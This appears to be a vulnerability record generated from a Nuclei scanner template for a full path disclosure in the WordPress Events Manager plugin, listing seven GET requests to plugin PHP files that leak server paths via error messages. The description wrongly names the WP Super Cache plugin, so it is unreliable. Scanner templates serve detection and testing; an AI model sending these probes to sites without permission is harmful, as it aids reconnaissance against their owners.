# Vulnerability: WordPress Events Manager - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wordpress-events-manager-fpd.yaml`)

## Description
WordPress WP Super Cache plugin files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/events-manager/classes/em-event.php
GET {{BaseURL}}/wp-content/plugins/events-manager/classes/em-booking.php
GET {{BaseURL}}/wp-content/plugins/events-manager/classes/em-location.php
GET {{BaseURL}}/wp-content/plugins/events-manager/classes/em-person.php
GET {{BaseURL}}/wp-content/plugins/events-manager/em-functions.php
GET {{BaseURL}}/wp-content/plugins/events-manager/widgets/em-events.php
GET {{BaseURL}}/wp-content/plugins/events-manager/admin/em-admin.php
```

